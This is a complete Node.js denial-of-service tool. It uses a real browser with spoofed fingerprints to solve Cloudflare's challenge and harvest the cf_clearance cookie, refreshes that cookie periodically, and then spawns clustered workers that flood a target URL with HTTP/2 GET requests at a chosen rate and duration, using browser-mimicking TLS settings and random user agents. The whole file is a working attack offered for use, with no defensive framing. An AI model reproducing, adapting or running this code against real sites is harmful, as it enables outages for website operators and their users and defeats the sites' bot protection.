const { connect } = require('puppeteer-real-browser');
const { FingerprintGenerator } = require('fingerprint-generator');
const timers = require('timers/promises');
const chalk = require('chalk');
const fs = require('fs');
const cluster = require('cluster');
const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const url = require('url');
const crypto = require('crypto');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node cbypass.js URL TIME REQ_PER_SEC THREADS\nExample: node ddos.js https://target.com 120 10 5`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = 'GREASE:' + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(':');

const sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
const ecdhCurve = 'GREASE:x25519:secp256r1:secp384r1';

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = 'TLS_client_method';
const secureContextOptions = {
    ciphers,
    sigalgs,
    honorCipherOrder: true,
    secureOptions,
    secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
};

const parsedTarget = new url.URL(args.target);
let currentCookies = [];
let userAgents = [];

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split(/\r?\n/).filter(l => l);
} catch {
    userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
    ];
}

async function bypassCloudflare() {
    console.log(chalk.white('[*] Launching real browser to bypass Cloudflare...'));
    try {
        const fingerprintGenerator = new FingerprintGenerator({
            devices: ['desktop'],
            browsers: ['chrome', 'firefox', 'edge', 'safari'],
            operatingSystems: ['windows', 'macos', 'linux']
        });
        const { browser, page } = await connect({
            headless: false,
            turnstile: true,
            fingerprint: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-blink-features=AutomationControlled',
                '--window-size=1920,1080',
                '--start-maximized'
            ],
            connectOption: { defaultViewport: null }
        });
        await page.goto(args.target, { waitUntil: 'networkidle2', timeout: 60000 });
        await timers.setTimeout(15000);
        const cookies = await page.cookies();
        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        const cfCookie = cookies.find(c => c.name === 'cf_clearance');
        if (cfCookie) console.log(chalk.green(`[+] Cloudflare bypass successful! cf_clearance: ${cfCookie.value.substring(0, 20)}...`));
        fs.writeFileSync('cookies.txt', cookieString);
        await browser.close();
        return cookieString;
    } catch (error) {
        console.log(chalk.red('[-] Cloudflare bypass error:'), error.message);
        return null;
    }
}

if (cluster.isMaster) {
    async function refreshCookieLoop() {
        console.log(chalk.white('[*] Getting initial Cloudflare cookies...'));
        const cookie = await bypassCloudflare();
        if (cookie) {
            currentCookies = [cookie];
            console.log(chalk.green('[+] Initial cookies obtained'));
        }
        if (currentCookies.length === 0) {
            try {
                const fileCookies = fs.readFileSync('cookies.txt', 'utf-8');
                if (fileCookies) {
                    currentCookies = [fileCookies];
                    console.log(chalk.green('[+] Loaded cookies from file'));
                }
            } catch {}
        }
        setInterval(async () => {
            console.log(chalk.blue('[*] Refreshing Cloudflare cookies...'));
            const newCookie = await bypassCloudflare();
            if (newCookie) {
                currentCookies = [newCookie];
                for (const id in cluster.workers) {
                    cluster.workers[id].send({ type: 'cookies', cookies: [newCookie] });
                }
            }
        }, 120000);
    }

    (async () => {
        if (!fs.existsSync('ua.txt')) {
            fs.writeFileSync('ua.txt', userAgents.join('\n'));
        }
        await refreshCookieLoop();
        for (let i = 1; i <= args.threads; i++) cluster.fork();
        console.log(chalk.green(`[+] Started ${args.threads} flood threads`));
        setTimeout(() => {
            console.log(chalk.green('\n[*] Attack finished!'));
            process.exit(0);
        }, args.time * 1000);
    })().catch(console.error);
} else {
    const maxSessionsPerWorker = 50;
    const sessionPool = [];
    let poolIndex = 0;
    let localCookies = [];

    process.on('message', msg => {
        if (msg.type === 'cookies') localCookies = msg.cookies;
    });

    try {
        const fileCookies = fs.readFileSync('cookies.txt', 'utf-8');
        if (fileCookies) localCookies = [fileCookies];
    } catch {}

    function createSession() {
        const connection = net.connect(443, parsedTarget.host, { allowHalfOpen: true });
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);
        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ['h2'],
            ciphers,
            sigalgs,
            ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureOptions,
            secureContext,
            servername: parsedTarget.host,
            secureProtocol
        };
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: 'https:',
            settings: { enablePush: false, initialWindowSize: 1073741823 },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });
        client.settings({ enablePush: false, initialWindowSize: 1073741823 });
        client.on('error', () => {
            const idx = sessionPool.indexOf(client);
            if (idx !== -1) sessionPool.splice(idx, 1);
            client.destroy();
            connection.destroy();
        });
        client.on('close', () => {
            const idx = sessionPool.indexOf(client);
            if (idx !== -1) sessionPool.splice(idx, 1);
        });
        sessionPool.push(client);
        return client;
    }

    function getSession() {
        if (sessionPool.length === 0) return createSession();
        if (sessionPool.length < maxSessionsPerWorker) createSession();
        poolIndex = (poolIndex + 1) % sessionPool.length;
        return sessionPool[poolIndex];
    }

    function randomIntn(min, max) {
        return Math.floor(Math.random() * (max - min) + min);
    }

    function randomElement(elements) {
        return elements[randomIntn(0, elements.length)];
    }

    function sendRequest() {
        const headers = {
            ':method': 'GET',
            ':path': parsedTarget.pathname,
            ':scheme': 'https',
            ':authority': parsedTarget.host,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
            'sec-ch-ua-mobile': randomElement(['?0', '?1']),
            'sec-ch-ua-platform': randomElement(['Android', 'iOS', 'Linux', 'macOS', 'Windows']),
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': randomElement(userAgents)
        };
        if (localCookies.length > 0) headers.cookie = localCookies[0];
        headers.referer = `https://${parsedTarget.host}${parsedTarget.pathname}`;
        const session = getSession();
        if (!session || session.destroyed) return;
        const req = session.request(headers);
        req.on('response', () => { req.close(); req.destroy(); });
        req.end();
    }

    const rate = args.Rate;
    let lastSend = Date.now();
    let tokens = rate;
    function flood() {
        const now = Date.now();
        const elapsed = now - lastSend;
        tokens += (elapsed / 1000) * rate;
        if (tokens > rate) tokens = rate;
        lastSend = now;
        const sendCount = Math.min(Math.floor(tokens), rate * 2);
        if (sendCount > 0) {
            tokens -= sendCount;
            for (let i = 0; i < sendCount; i++) setImmediate(sendRequest);
        }
        setImmediate(flood);
    }
    flood();
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
